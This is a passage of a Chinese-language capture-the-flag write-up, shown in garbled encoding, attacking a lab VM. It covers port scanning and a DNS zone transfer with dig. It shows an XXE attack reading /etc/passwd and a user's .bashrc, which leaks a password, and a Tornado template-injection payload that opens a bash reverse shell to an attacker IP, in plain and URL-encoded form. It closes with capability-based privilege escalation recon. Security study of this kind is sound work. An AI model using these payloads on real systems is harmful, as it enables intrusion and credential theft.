<li>ç»™è¿™å°æœåŠ¡å™¨åˆ†é…å¤šä¸ªIPåœ°å€ï¼Œæ¯ä¸ªwebåº”ç”¨çš„åŸŸåå¯¹åº”çš„IPåœ°å€éƒ½ä¸ä¸€æ ·ï¼Œè¿™æ ·å­å°±å¯ä»¥é€šè¿‡ä¸åŒçš„åŸŸåæˆ–è€…IPåœ°å€è®¿é—®ä¸åŒçš„webåº”ç”¨ï¼›</li>
<li>è¿™å°æœåŠ¡å™¨åªæœ‰ä¸€ä¸ªIPåœ°å€ï¼Œä½†æ˜¯å¼€æ”¾å¤šä¸ªç«¯å£ï¼Œå¯ä»¥æŠŠä¸åŒçš„webåº”ç”¨ç»‘å®šåœ¨ä¸åŒçš„ç«¯å£ä¸Šï¼Œè¿™æ ·å­å°±èƒ½å¤Ÿé€šè¿‡ä¸åŒçš„åŸŸåè®¿é—®å¯¹åº”çš„webåº”ç”¨ï¼›</li>
<li>è¿™å°æœåŠ¡å™¨åªæœ‰ä¸€ä¸ªIPåœ°å€ï¼Œä¹Ÿåªå¼€æ”¾äº†ä¸€ä¸ªç«¯å£ï¼Œè¿™æ—¶å€™å°±éœ€è¦åˆ©ç”¨<strong>è™šæ‹Ÿä¸»æœºæŠ€æœ¯</strong>ï¼Œå°±æ˜¯é€šè¿‡ä¸åŒçš„åŸŸåå»è®¿é—®è¿™å°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ®åŸŸåå“åº”å¯¹åº”çš„webåº”ç”¨ï¼›ï¼ˆæ¯”å¦‚ï¼š<code>/etc/hosts</code>ä¸­å°†ä¸åŒçš„åŸŸåå¯¹åº”åŒä¸€ä¸ªIPï¼‰</li>
</ol>
<h2 id="ä¸ºä»€ä¹ˆéœ€è¦dnsåŸŸä¼ é€">ä¸ºä»€ä¹ˆéœ€è¦DNSåŸŸä¼ é€</h2>
<p>DNSæ˜¯éå¸¸é‡è¦çš„ä¸€ä¸ªæœåŠ¡ï¼Œå¦‚æœDNSåŸŸçš„DNSæœåŠ¡å™¨ä¸å·¥ä½œï¼Œæˆ–è€…ä¿å­˜çš„ä¿¡æ¯è¿‡æœŸäº†ï¼Œé‚£ä¹ˆè¿™ä¸ªåŸŸå†…çš„æ‰€æœ‰åŸŸåéƒ½æ— æ³•è¢«è§£æï¼Œå› è€Œå¯¹åº”çš„æœåŠ¡ä¹Ÿå°±æ— æ³•è¢«è®¿é—®ã€‚å› æ­¤ï¼Œæ¯ä¸ªåŸŸè‡³å°‘åº”è¯¥æœ‰ä¸¤ä¸ªDNSæœåŠ¡å™¨ï¼Œå¯¹äºæ›´å…³é”®çš„åŒºåŸŸï¼Œå¯èƒ½å­˜åœ¨ç€æ›´å¤šçš„DNSæœåŠ¡å™¨ã€‚</p>
<p>æœ‰çš„DNSåŸŸéå¸¸çš„å¤§ï¼Œå¹¶ä¸”åŸŸå†…çš„ä¿¡æ¯å¯èƒ½ç»å¸¸æ”¹å˜ã€‚æ­¤æ—¶ï¼Œå¦‚æœç®¡ç†å‘˜åœ¨è¯¥åŸŸå†…çš„æ¯å°DNSæœåŠ¡å™¨ä¸Šæ‰‹åŠ¨çš„ä¿®æ”¹ä¿¡æ¯çš„è¯ï¼Œè¿™ä¸ä»…è€—è´¹å¤§é‡çš„æ—¶é—´ï¼Œè€Œä¸”ä¹Ÿå®¹æ˜“å‡ºé”™ã€‚å› æ­¤ï¼Œè¿™æ—¶å€™å°±éœ€è¦DNSåŸŸä¼ é€æœºåˆ¶ã€‚</p>
<p>DNSåŸŸä¼ é€çš„ä½œç”¨ï¼šç®¡ç†å‘˜åªéœ€è¦åœ¨ä¸»DNSæœåŠ¡å™¨ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œç„¶åå…¶ä»–DNSæœåŠ¡å™¨å¯ä»¥é€šè¿‡æŸç§åè®®æ¥è¯·æ±‚ä¸»DNSæœåŠ¡å™¨ä¸Šçš„å…¨éƒ¨ä¿¡æ¯ã€‚å…¶ä¸­æœ€ç®€å•çš„åè®®å°±æ˜¯<code>AXFR</code>ã€‚</p>
<h2 id="dnsåŸŸä¼ é€æ¼æ´">DNSåŸŸä¼ é€æ¼æ´</h2>
<p>å…¶å®ä¸»è¦çš„æ˜¯<code>AXFR</code>åè®®å­˜åœ¨æ¼æ´ï¼Œè¯¥åè®®å…è®¸åŸŸå†…æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚DNSæœåŠ¡å™¨ä¸Šçš„ä¿¡æ¯ã€‚åªéœ€è¦è·å¾—ä¸€å°åŸŸå†…çš„ä¸»æœºï¼Œå°±å¯ä»¥é€šè¿‡è¯¥æ¼æ´è·å¾—è¯¥DNSåŸŸå†…æ‰€æœ‰å­åŸŸåã€‚æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ç§<strong>ä¿¡æ¯æ³„éœ²æ¼æ´</strong>ã€‚</p>
<h2 id="dnsåŸŸåè§£æ">DNSåŸŸåè§£æ</h2>
<p>DNSæœåŠ¡åŒæ—¶å ç”¨TCPå’ŒUDPçš„53ç«¯å£ã€‚DNSåœ¨è¿›è¡ŒåŸŸä¼ é€çš„æ—¶å€™ä½¿ç”¨TCPåè®®ï¼Œå…¶å®ƒæ—¶å€™åˆ™ä½¿ç”¨UDPåè®®ã€‚</p>
<p>æ‰€ä»¥ï¼Œå¦‚æœä¸€å°ä¸»æœºå¼€å¯äº†<code>53/TCP</code>ï¼Œé‚£ä¹ˆè¯¥ä¸»æœºä¹Ÿæå¤§å¯èƒ½å¼€å¯<code>53/UDP</code>ï¼Œå¹¶ä¸”è¯¥ä¸»æœºåŸºæœ¬å¯ä»¥è®¤å®šä¸ºæ˜¯ä¸€å°DNSæœåŠ¡å™¨ã€‚ä½†æ˜¯åè¿‡æ¥ï¼Œå¦‚æœæŸå°ä¸»æœºå¼€å¯äº†<code>53/UDP</code>ï¼Œé‚£ä¹ˆè¯¥ä¸»æœºä¸ä¸€å®šå¼€å¯äº†<code>53/TCP</code>ï¼Œå› æ­¤ï¼Œè¯¥ä¸»æœºæ˜¯DNSæœåŠ¡å™¨çš„å¯èƒ½æ€§ä¹Ÿä¸å¤§ã€‚</p>
<h1 id="capabilitiesæŠ€æœ¯">CapabilitiesæŠ€æœ¯</h1>
<p>Capabilitiesæ˜¯Linuxçš„ä¸€ä¸ªå†…æ ¸åŠŸèƒ½ã€‚ä½œç”¨ï¼šæƒé™ç®¡ç†ã€‚è¯¥åŠŸèƒ½å°†æ“ä½œç³»ç»Ÿå¾ˆå¤šéœ€è¦ç‰¹æƒæ‰èƒ½æ‰§è¡Œçš„æ“ä½œï¼ˆé€šå¸¸åªæœ‰rootå’Œç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œçš„ç³»ç»Ÿæ“ä½œï¼‰åˆ†æˆ40+ä¸ªåŠŸèƒ½ã€‚æ¯ä¸€ä¸ªåŠŸèƒ½éƒ½èƒ½å•ç‹¬çš„èµ‹äºˆç»™ç¨‹åºã€‚å½“æŸä¸ªç¨‹åºè¢«èµ‹äºˆäº†åŠŸèƒ½ï¼Œé‚£ä¹ˆå³ä½¿æ‰§è¡Œè¯¥ç¨‹åºçš„åªæ˜¯æ™®é€šç”¨æˆ·ï¼ˆä¸æ˜¯rootï¼Œæ²¡æœ‰suidï¼Œä¸åœ¨rootç»„ç­‰ï¼‰ï¼Œä¹Ÿèƒ½å¤Ÿä½¿ç”¨å¯¹åº”çš„ç‰¹æƒæ“ä½œã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</span><br><span class="line"><span class="comment"># èµ‹äºˆ/usr/bin/dumpcapç¨‹åºæŠ“æ•°æ®åŒ…å’ŒæŠ“ç½‘ç»œç®¡ç†ç›¸åº”ç»„ä»¶ä¸¤ç§èƒ½åŠ›ã€‚</span></span><br></pre></td></tr></table></figure>
<p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://linux.die.net/man/7/capabilities">Capabilities</a></p>
<h1 id="æ¸—é€">æ¸—é€</h1>
<p>æ”»å‡»æœºkaliï¼š10.0.2.4</p>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l <span class="comment"># é¶æœºä¸º10.0.2.10</span></span><br><span class="line">sudo nmap -p- 10.0.2.10</span><br><span class="line">sudo nmap -p53,80,9999 -A 10.0.2.10</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408084845.png" /></p>
<p>53ç«¯å£ä¸Šæ˜¯åŸŸæœåŠ¡ï¼Œç‰ˆæœ¬ä¸ºISC BIND 9.16.1ï¼Œå¹¶ä¸”å¼€å¯çš„æ˜¯53/TCPï¼Œæœ‰ç†ç”±è®¤ä¸ºè¯¥ä¸»æœºæ˜¯åŸŸå†…çš„DNSæœåŠ¡å™¨ï¼Œå¹¶ä¸”53/UDPä¹Ÿæ˜¯å¼€å¯ç€çš„ã€‚è¾“å…¥ä¸‹é¢å‘½ä»¤éªŒè¯ä¸‹ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53 -sU 10.0.2.10</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085115.png" /></p>
<p>å‘ç°ç¡®å®å¦‚æ­¤ã€‚ISC BIND 9.16.1 å­˜åœ¨ç€ä¸¤ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œç¼–å·ä¸ºCVE-2020-8625å’ŒCVE-2021-25216ï¼ˆæ‰¾ä¸åˆ°æ¼æ´åˆ©ç”¨ä»£ç ï¼‰</p>
<p>80ç«¯å£å’Œ9999ç«¯å£å¼€ç€çš„éƒ½æ˜¯httpæœåŠ¡ã€‚80ç«¯å£ä¸Šæ˜¯apache2ï¼Œ9999ç«¯å£ä¸Šæ˜¯tornadoï¼Œè¿™æ˜¯pythonè¯­è¨€çš„ä¸€ä¸ªæ¨¡æ¿ï¼Œæ‰€ä»¥åç»­å¯èƒ½ä¼šç”¨åˆ°æ¨¡æ¿æ³¨å…¥ï¼</p>
<p>é¶æœºçš„OSæ˜¯Ubuntuã€‚</p>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p>å…ˆè®¿é—®80ç«¯å£ï¼Œé¡µé¢å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085401.png" /></p>
<p>è¿™é‡Œæ³¨æ„åˆ°ä¸€ä¸ªå¤§å†™çš„å•è¯<code>DIG</code>ï¼Œè¿™æ˜¯Linuxçš„ä¸€ä¸ªå·¥å…·ï¼Œä½†æ˜¯ä½¿ç”¨è¯¥å·¥å…·éœ€è¦çŸ¥é“é¶æœºçš„åŸŸåï¼Œå› æ­¤æ¥ä¸‹æ¥å°±æ˜¯éœ€è¦æ‰¾åˆ°å…³äºåŸŸåçš„ä¿¡æ¯ã€‚</p>
<p>æŸ¥çœ‹é¡µé¢æºç çš„å°æŠ€å·§ï¼š</p>
<ol type="1">
<li>ä¸€æ–¹é¢å…³æ³¨è¿™ä¸ªé¡µé¢åˆ°åº•å¼•ç”¨äº†å“ªäº›é¡µé¢èµ„æºï¼Œå­˜åœ¨å“ªäº›è·¯å¾„</li>
<li>å¦ä¸€æ–¹é¢å¾—å…³æ³¨<strong>æ³¨é‡Šä¿¡æ¯</strong></li>
</ol>
<p>æŸ¥çœ‹æºç ï¼Œåœ¨æœ€åå‘ç°äº†æŸä¸€è¡Œæ³¨é‡Šï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TO DO: Use a GET parameter page_no  to view pages.</span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿå°±æ˜¯åœ¨è¯¥é¡µé¢ä¸Šå­˜åœ¨ç€ä¸€ä¸ªå‚æ•°<code>page_no</code>ï¼Œä»¥GETæ–¹å¼æäº¤ã€‚</p>
<p>åˆçœ‹äº†ä¸€äº›å…¶ä»–ç½‘å€ï¼Œæ¯”å¦‚ä¸»é¡µä¸Šçš„<code>App</code>å’Œ<code>Form</code>ï¼Œ<strong>ç›´æ¥ç‚¹å‡»ä¼šå‡ºç°<code>10.0.2.10/#from.html</code>ï¼ŒæŠŠ<code>#</code>å»æ‰å°±å¯ä»¥ç›´æ¥è®¿é—®äº†</strong>ã€‚ä½†æ˜¯ï¼Œå‘ç°è™½ç„¶æœ‰å¾ˆå¤šè¡¨å•ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯ç”¨çš„åœ°æ–¹ï¼ŒåŸºæœ¬éƒ½åªæ˜¯åšä¸ªæ ·å­ã€‚</p>
<p>é‚£å…ˆå¸¦å…¥<code>page_no</code>å»è®¿é—®ä¸€ä¸‹ï¼Œçœ‹ä¸€ä¸‹é¡µé¢ä¼šä¸ä¼šå‘ç”Ÿä»€ä¹ˆå˜åŒ–ã€‚å°è¯•äº†1ï¼Œ2ï¼Œ3ï¼Œ4ä¹‹åå‘ç°å˜åŒ–éƒ½ä¸€æ ·ï¼Œå¤šäº†ä¸€å¥è¯<code>Oh Man !! Isn't is right to go a little deep inside?</code>ï¼Œå› æ­¤ç”¨burpæ¥è·‘ï¼Œåé¢è‚¯å®šè¿˜æœ‰å˜åŒ–ã€‚ç»“æœå‘ç°ï¼Œå½“<code>page_no=21</code>æ—¶ï¼Œè¿”å›çš„å“åº”åŒ…é•¿åº¦å‡ºç°äº†å˜åŒ–ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408090450.png" /></p>
<p>ç›´æ¥è®¿é—®å‘ç°é¡µé¢çš„è¯å˜æˆäº†å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Okay so you want me to speak something ?  </span><br><span class="line">I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!  </span><br><span class="line">Out of my many homes...one such home..one such home for me : hackers.blackhat.local</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°äº†ä¸€ä¸ªåŸŸå<code>hackers.blackhat.local</code>ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªä¸‰çº§åŸŸåï¼Œ<code>blackhat.local</code>ä¹Ÿæ˜¯ä¸€ä¸ªåŸŸåã€‚å› æ­¤ï¼Œè·å¾—äº†ä¸¤ä¸ªåŸŸåã€‚</p>
<p>å°†åŸŸåæ·»åŠ åˆ°<code>/etc/hosts</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091613.png" /></p>
<p>ç„¶åç›´æ¥ç”¨æµè§ˆå™¨è®¿é—®ï¼Œå‘ç°<code>hackers.blackhat.local</code>é¡µé¢å’Œæœ€å¼€å§‹çš„ç•Œé¢ä¸€æ ·ï¼Œè€Œ<code>blackhat.local</code>æ²¡æœ‰æƒé™è®¿é—®ã€‚</p>
<p>æ¥ä¸‹æ¥è®¿é—®9999ç«¯å£ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091937.png" /></p>
<p>é‚£ä¸¤ä¸ªåŸŸååŠ ä¸Š9999ç«¯å£ä¹Ÿéƒ½æ˜¯åŒæ ·çš„ç•Œé¢ï¼Œç­‰ä¼šæµ‹è¯•ã€‚</p>
<h2 id="dnsåŸŸä¼ é€æ¼æ´-1">DNSåŸŸä¼ é€æ¼æ´</h2>
<p>åˆ©ç”¨<code>DIG</code>é…åˆ<code>AXFR</code>åè®®è·å–æ›´å¤šçš„åŸŸå†…ä¿¡æ¯ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig axfr @10.0.2.10 hackers.blackhat.local <span class="comment"># å¤±è´¥</span></span><br><span class="line">dig axfr @10.0.2.10 blackhat.local</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408092336.png" /></p>
<p>è·å¾—äº†æ›´å¤šçš„åŸŸåä¿¡æ¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerkid.blackhat.local</span><br><span class="line">ftp.blackhat.local</span><br><span class="line">mail.blackhat.local</span><br><span class="line">hacker.blackhat.local.blackhat.local</span><br><span class="line">www.blackhat.local</span><br></pre></td></tr></table></figure></p>
<p>æŠŠè¿™äº›éƒ½å†™å…¥<code>/etc/hosts</code>ç„¶åç”¨æµè§ˆå™¨ç›´æ¥è®¿é—®ã€‚</p>
<p>åœ¨80ç«¯å£ä¸‹ï¼Œä¸Šé¢5ä¸ªåŸŸåä¸­ï¼Œç¬¬ä¸€ä¸ªåŸŸåå‡ºç°äº†å¦‚ä¸‹ç•Œé¢</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093020.png" /></p>
<p>ç¬¬äº”ä¸ªåŸŸåæ²¡æœ‰æƒé™è®¿é—®ï¼Œå…¶ä»–çš„åŸŸåéƒ½å’ŒåŸæ¥çš„ç•Œé¢ä¸€æ ·ã€‚</p>
<p>åœ¨9999ç«¯å£ä¸‹ï¼Œ5ä¸ªåŸŸåè®¿é—®çš„å’Œä¹‹å‰9999ç«¯å£çš„ç•Œé¢ä¸€æ ·ã€‚</p>
<p>å¡«å†™è¡¨å•ï¼ŒæŠ“å–<code>hackerkid.blackhat.local:80</code>æ•°æ®åŒ…çœ‹ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093729.png" /></p>
<p>å‘ç°äº†ä¸¤ç‚¹ï¼š</p>
<ol type="1">
<li>è¿™ä¸ªè¡¨å•æ˜¯XMLæäº¤çš„</li>
<li>æ— è®ºæˆ‘ä»¬åœ¨<code>&lt;email&gt;</code>æ ‡ç­¾å†…æäº¤ä»€ä¹ˆå†…å®¹ï¼Œéƒ½ä¼šè¢«åŸå°ä¸åŠ¨çš„è¿”å›å›æ¥<code>Sorry, hdfzzf@gmail.com is not available !!!</code></li>
</ol>
<p>å…ˆåˆ†æç¬¬äºŒç‚¹ï¼Œä¸è®ºæˆ‘ä»¬è¾“å…¥ä»€ä¹ˆå†…å®¹ï¼ŒæœåŠ¡ç«¯éƒ½ä¼šåŸå°ä¸åŠ¨å¾—è¿”å›ç»™æˆ‘ä»¬ï¼Œè¿™æ˜¯ä¸‰ç§æ¼æ´çš„ç‰¹å¾ï¼š</p>
<ol type="1">
<li>XSSæ¼æ´</li>
<li>XXEæ¼æ´</li>
<li>SSTIæ¼æ´</li>
</ol>
<p>åˆå› ä¸ºè¿™é‡Œçš„è¡¨å•æ˜¯XMLï¼Œæ‰€ä»¥æ€€ç–‘è¿™é‡Œå­˜åœ¨ç€XXEæ¼æ´ã€‚</p>
<h2 id="xxeæ¼æ´">XXEæ¼æ´</h2>
<p>å…ˆéªŒè¯ä»¥ä¸‹æ˜¯å¦å­˜åœ¨XXEæ¼æ´ï¼ŒæŠ“æ•°æ®åŒ…ä¿®æ”¹ï¼Œç„¶åå‘é€</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408100434.png" /></p>
<p>å‘ç°ç¡®å®è¿”å›äº†<code>/etc/passwd</code>ä¸­çš„å†…å®¹ï¼Œè¯´æ˜ç¡®å®å­˜åœ¨XXEæ¼æ´ã€‚å¯»æ‰¾è·Ÿ<code>/bin/bash</code>æœ‰å…³çš„è´¦å·ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash</span><br></pre></td></tr></table></figure></p>
<p>ç„¶ååˆ©ç”¨è¯¥æ¼æ´è¯»å–æ–‡ä»¶å†…å®¹ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/saket/.bashrc <span class="comment"># bashé…ç½®ä¿¡æ¯</span></span><br><span class="line">/home/saket/id_rsa <span class="comment"># ç§é’¥</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯å‘ç°ä»€ä¹ˆå†…å®¹éƒ½è¯»å–ä¸å‡ºæ¥ï¼Œè¿™æ—¶å€™æ–‡ä»¶å¯èƒ½å­˜åœ¨å†…å®¹ï¼Œä½†æ˜¯åˆ«é™åˆ¶ä¸å…è®¸æ˜æ–‡è¾“å‡ºï¼Œäºæ˜¯ä½¿ç”¨ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure></p>
<p>å°†å¾—åˆ°çš„å†…å®¹è§£ç å‘ç°äº†</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408101522.png" /></p>
<p>é¦–å…ˆçŒœæµ‹è¿™æ˜¯å“ªé‡Œçš„å¯†ç ï¼Œå› ä¸ºè¿™å°é¶æœºæ²¡æœ‰å¼€22ç«¯å£ï¼Œæ‰€ä»¥ä¸å­˜åœ¨sshè¿æ¥ã€‚å¿½ç„¶æƒ³åˆ°ï¼Œåˆšåˆš9999ç«¯å£å­˜åœ¨ç™»é™†ç•Œé¢ï¼Œå› æ­¤å»é‚£é‡Œå°è¯•ä¸€ä¸‹ã€‚</p>
<p>å‘ç°ç”¨ä¸‹é¢çš„ä¿¡æ¯ç™»å½•ä¸æˆåŠŸã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„ä¿¡æ¯ä¸å¤ªå¯èƒ½æ˜¯å‡çš„ï¼Œé‚£å°±å°è¯•å°†ç”¨ä¸‹é¢ä¿¡æ¯ç™»å½•ï¼ˆ<code>/bin/bash</code>ä¸­æœ‰saketè¿™ä¸ªè´¦å·ï¼‰ï¼Œå‘ç°å±…ç„¶æˆåŠŸäº†ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: saket</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408102116.png" /></p>
<p>ä»ä¸Šå›¾ä¸­çš„è¯­å¥ä¸­åˆ†æï¼Œå¯èƒ½æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªå‚æ•°<code>name</code>ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡å‚æ•°çˆ†ç ´ï¼Œç†è®ºä¸Šæ˜¯å¯è¡Œçš„ï¼Œä¸è¿‡è¯¥é¶æœºä¸å»ºè®®çˆ†ç ´ï¼Œå› æ­¤å…ˆå°è¯•ä¸€ä¸‹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103126.png" /></p>
<p>å› æ­¤ï¼Œè¿™é‡Œå¯èƒ½<code>name</code>å¯èƒ½å­˜åœ¨ç€æŸç§æ³¨å…¥æ¼æ´ã€‚ç»è¿‡æµ‹è¯•ï¼Œå‘ç°æ— è®ºæˆ‘ä»¬åœ¨åé¢åŠ å…¥ä»€ä¹ˆå€¼ï¼Œéƒ½ä¼šåŸå°ä¸åŠ¨çš„è¿”å›ã€‚æ ¹æ®ä¹‹å‰çš„æè¿°ï¼Œå…±æœ‰ä¸‰ç§æƒ…å†µï¼Œä½†æ˜¯XSSå’ŒXXEä¸å¤ªå¯èƒ½å‡ºç°åœ¨urlä¸­ï¼Œå› æ­¤çŒœæµ‹å¯èƒ½å­˜åœ¨SSTIã€‚å¹¶ä¸”æœ€å¼€å§‹æ”¶é›†çš„ä¿¡æ¯ä¸­ä¹Ÿæ˜¾ç¤º9999ç«¯å£ä¸Šæ˜¯tornadoæ¨¡æ¿ï¼Œæ‰€ä»¥SSTIçš„å¯èƒ½æ€§å¾ˆå¤§ï¼Œå¹¶ä¸”æ¨¡æ¿å¼•æ“ä¸ºtornadoã€‚</p>
<h2 id="sstiæ¼æ´-get-shell">SSTIæ¼æ´ Get shell</h2>
<p>æ¨¡æ¿æ³¨å…¥é€šæ€payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%&gt;[abcxyz]</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœå­˜åœ¨æŠ¥é”™ï¼ŒåŸºæœ¬è¯´æ˜æœåŠ¡ç«¯å­˜åœ¨SSTIã€‚abcxyzå°½é‡é€‰æ‹©æ— è§„åˆ™çš„å­—ç¬¦ï¼Œè¿™æ ·å¯ä»¥ä¿è¯æœåŠ¡ç«¯æ²¡æœ‰å®šä¹‰è¿‡è¯¥å˜é‡åã€‚æ­¤æ—¶ï¼ŒæœåŠ¡ç«¯å¼•ç”¨è¯¥å˜é‡åå°±ä¼šæŠ¥é”™ï¼Œä»è€Œåˆ¤æ–­å¯èƒ½å­˜åœ¨æ¨¡æ¿æ³¨å…¥ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸€ä¸‹å“ªä¸€ä¸ªè¢«æ‰§è¡Œäº†ï¼Œä»è€Œå¯ä»¥åˆ¤æ–­æ¨¡æ¿å¼•æ“å’Œè¯­è¨€ã€‚å‰è€…è¡¨ç¤ºçš„PHPç±»æ¨¡æ¿ï¼Œè€Œåè€…è¡¨ç¤ºpythonç±»æ¨¡æ¿ã€‚Javaæ¨¡æ¿ä¸å¤šã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103754.png" /></p>
<p>å¦‚æœæ˜¯pythonï¼Œå¯ä»¥åˆ©ç”¨ä¸‹é¢ä»£ç è¿›è¡Œåå¼¹shellï¼ˆkaliå…ˆå¼€å¯ç›‘å¬ï¼‰ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> os %&#125;&#123;&#123;os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/3333 0&gt;&amp;1&quot;&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœæŠ¥é”™äº†ï¼Œéœ€è¦å¯¹ä¸Šè¿°payloadè¿›è¡Œä¸€äº›ç¼–ç ï¼Œæ¯”å¦‚urlç¼–ç ï¼ˆèŠ±æ‹¬å·ï¼Œç™¾åˆ†å·ï¼Œå¼•å·ï¼Œæ–œæ ç­‰ç‰¹æ®Šç¬¦å·éƒ½éœ€è¦ç¼–ç ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.4%2F3333%200%3E%261%22%27)%7D%7D</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103958.png" /></p>
<p>æˆåŠŸçªç ´è¾¹ç•Œï¼</p>
<h2 id="æƒé™æå‡capabilitiesææƒ">æƒé™æå‡â€”â€”Capabilitiesææƒ</h2>
<p>ä¸è®ºæ˜¯å†…æ ¸æ¼æ´ã€sudoé…ç½®ä¸å½“ä»¥åŠsuidéƒ½æ²¡æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚ä¹Ÿä¸èƒ½åƒ<code>6 EvilBoxOne</code>ä¸€æ ·æ‰¾åˆ°æ‹¥æœ‰å†™æƒé™çš„å¯åˆ©ç”¨æ–‡ä»¶ã€‚</p>
<p>è¿™é‡Œä»‹ç»ä¸€ç§æ–°çš„ææƒæ–¹å¼ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p>ä¸Šè¿°å‘½ä»¤æ˜¯æŸ¥çœ‹ç³»ç»Ÿä¸Šæ‰€æœ‰ç¨‹åºçš„åŠŸèƒ½ã€‚<code>-r</code>ï¼šé€’å½’ã€‚å¦‚æœæ²¡æœ‰ç»“æœï¼Œå¯ä»¥å…ˆè¾“å…¥<code>getcap</code>æŸ¥çœ‹ä¸€ä¸‹ä½ç½®åœ¨å“ªï¼Œç„¶å <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/<span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408105514.png" /></p>
<p><strong>æ³¨æ„<code>cap_sys_ptrace+ep</code>å¯ä»¥ç”¨æ¥ææƒ</strong>ã€‚ä¹Ÿå°±æ˜¯ä¸Šå›¾ä¸­çš„<code>python2.7</code>æ‹¥æœ‰çš„åŠŸèƒ½ã€‚å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc">cap_sys_ptraceææƒ</a></p>
